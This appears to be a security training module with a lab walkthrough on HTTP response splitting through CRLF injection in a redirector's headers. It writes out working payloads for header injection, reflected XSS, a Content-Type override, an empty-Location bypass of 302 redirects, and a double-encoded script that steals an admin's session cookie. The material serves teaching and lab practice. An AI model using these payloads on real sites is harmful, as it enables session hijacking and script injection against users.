# HTTP Response Splitting

HTTP Response Splitting is a serious vulnerability that arises when web servers reflect user input in HTTP headers without proper sanitization. Since HTTP headers are separated only by newline characters, an injection of the CRLF character sequence breaks out of the intended HTTP header and allows an attacker to append further arbitrary HTTP headers and even manipulate the response. This can lead to reflected XSS vulnerabilities.

## Identification

The exercise below contains a simple web application that implements a redirection service:

```http
http://<SERVER_IP>:<PORT>/
```
Redirector interface with a field labeled "Redirection Target" and a "Submit" button.

It works by setting the user-supplied target domain in the `Refresh` header, which tells the client's browser to load the specified URL after the given amount of seconds (in this case 2):

```http
HTTP request and response. Request: GET with target parameter set to http://hackthebox.com from responsesplitting.htb. Response: 200 OK. Header: "refresh: 2; url=http://hackthebox.com".
```

We can simply confirm that no sanitization is implemented by injecting the CRLF sequence and attempting to append our own header to the response with a request like the following:

```http
GET /?target=http%3A%2F%2Fhackthebox.com%0d%0aTest:%20test HTTP/1.1
Host: responsesplitting.htb
```

Looking at the response, we successfully injected our own header into the response:

```http
HTTP request and response. Request: GET with target parameter set to http://hackthebox.com and additional header Test: test from responsesplitting.htb. Response: 200 OK. Headers: "refresh: 2; url=http://hackthebox.com" and "Test: test".
```

The injection works as the response contains the newline sequence we injected and treats the appended data as a separate HTTP header.

## Exploitation

HTTP response splitting can be exploited in multiple ways. The simplest and most generic approach would be to construct a reflected XSS attack. Since we can append arbitrary lines to the HTTP header our payload is reflected in, we can effectively modify the entire response without any restrictions. The original page is of course appended to our payload but this does not prevent us from executing any injected JavaScript code.

Let's construct a simple proof of concept. To do so, we need to inject two new lines since these separate the HTTP response body from the HTTP headers section. We can then inject our XSS payload which will be treated as the response body by our browser. This results in a request like this:

```http
GET /?target=http%3A%2F%2Fhackthebox.com%0d%0a%0d%0a<html><script>alert(1)</script></html> HTTP/1.1
Host: responsesplitting.htb
```

Our XSS payload is reflected in the response body and successfully executed by our web browser:

```http
HTTP request and response.Request: GET with target parameter set to http://hackthebox.com and injected HTML/JavaScript from responsesplitting.htb.Response: 200 OK. Headers: "refresh: 2; url=http://hackthebox.com". Body contains injected script.
```

### Exploitation of HTTP 302 Redirects

It is probably more common to see a redirect via an HTTP 302 status code and the `Location` header rather than the `Refresh` header. In this case, the web browser immediately redirects the user without displaying the content. Thus, our previous payload would not work as the web browser simply ignores it:

```http
HTTP request and response. Request: GET with target parameter set to http://hackthebox.com and injected HTML/JavaScript from responsesplitting.htb. Response: 302 Found. Location: http://hackthebox.com. Body contains injected script.
```

In this case, the browser reads the `Location` header and redirects the user to the new location without ever executing our malicious XSS payload. Luckily for us, there is an easy workaround for this. We can simply supply an empty `Location` header:

```http
GET /?target=%0d%0a%0d%0a<html><script>alert(1)</script></html> HTTP/1.1
Host: responsesplitting.htb
```

Since an empty location is invalid, the browser does not know where to navigate and displays the response body, thus executing our XSS payload:

```http
HTTP request and response. Request: GET with target parameter containing injected HTML/JavaScript from responsesplitting.htb. Response: 302 Found. Empty Location header. Body contains injected script.
```

**Note:** As of writing this module, this behavior does not work in Firefox and instead results in a redirection error. However, the payload is correctly executed in Chromium.

## Exploitation Remarks

HTTP Response Splitting can be exploited in other ways than reflected XSS. For instance, we can easily deface the website by injecting arbitrary HTML content in the response. If the web application is deployed in an incorrectly configured setting, we might be able to exploit a vulnerability like web cache poisoning to further escalate HTTP response splitting. For more details on web cache poisoning, check out the Abusing HTTP Misconfigurations module. Lastly, if the web application implements custom headers or uses headers to implement security measures such as Clickjacking protection or a Content-Security-Policy (CSP), HTTP response splitting can lead to bypasses of these security measures as well.

## Lab Walkthrough

After visiting the web application, students need to notice that they can report issues to the admin user, passing an "Issue URL" that can be sent via the "Redirector" service.

Students need to test whether the "Redirector" service form suffers from HTTP Response Splitting. Using Burp Suite, students should intercept the request and test for HTTP Response Splitting by injecting the CRLF character sequence followed by an arbitrary header:

```http
GET /?target=academy.hackthebox.com%0d%0aInjected:+True HTTP/1.1
```

Upon inspecting the response, students will notice that the web server is vulnerable to HTTP Response Splitting, as the user input is reflected in the HTTP headers without proper sanitization.

Students then need to test if they can inject JavaScript into the response's body to attempt an XSS attack by using two CRLF character sequences. However, they will notice that the response's body is not being rendered/treated as HTML due to the `Content-Type` header being set to `text/plain` by the web server:

```http
GET /?target=academy.hackthebox.com%0d%0a%0d%0a<html><script>alert("Injected+JS+in+body")</script></html> HTTP/1.1
```

Therefore, students need to override the default `Content-Type` header provided by the web server by injecting another one with the value of `text/html`, making the web browser render the HTML:

```http
GET /?target=academy.hackthebox.com%0d%0aContent-Type:+text/html%0d%0a%0d%0a<html><script>alert("Injected+JS+in+body")</script></html> HTTP/1.1
```

Moreover, students need to notice that the web server is using the HTTP 302 Found status code along with the `Location` header to facilitate redirections. This forces the web browser to immediately redirect without executing the XSS payload. To circumvent this, students need to supply an empty value for the `Location` header, which is deemed invalid by the browser, forcing it to display the response body and execute the XSS payload:

```http
GET /?target=%0d%0aContent-Type:+text/html%0d%0a%0d%0a<html><script>alert("Injected+JS+in+body")</script></html> HTTP/1.1
```

Now, students need to steal the admin user's cookie by coercing the admin into requesting the webpage `/?admin` with the document's cookie. Students need to utilize `document.location` to send the cookie value to `/?admin=`:

```javascript
<script>document.location='/?admin='+document.cookie;</script>
```

The resultant "issue URL" becomes:

```
%0d%0aContent-Type: text/html%0d%0a%0d%0a<html><script>document.location='/?admin='+document.cookie;</script></html>
```

However, students need to keep in mind that there will be two requests until the desired XSS payload reaches the admin:

1. The request to `/?admin=` to report the "Issue URL" to the admin user; since the payload is contained within the `admin` GET parameter, students need to URL-encode special characters once.
2. The request to `/?target=` that students will report to the admin user in the `admin` GET parameter in the first request; since the payload is contained within the `target` GET parameter, students need to URL-encode special characters twice.

The special characters CRLF (`%0d%0a` → `%250d%250a`), white-space (` ` → `%2520`), equals symbol (`=` → `%253D`) and the plus symbol (`+` → `%252B`) need to be URL-encoded two times (except for `%0d%0a`, which needs to be URL-encoded only one time since it is already in URL-encoding), attaining the payload:

```
%250d%250aContent-Type:%2520text/html%250d%250a%250d%250a<html><script>document.location%253D'/?admin='%252Bdocument.cookie;</script></html>
```

Students need to send this payload to the admin via the "Issue URL" form, making sure to set the payload after `/?target=`. After waiting for a few seconds for the admin to inspect the link, students need to check the log file at `/log` to obtain the admin's cookie value.


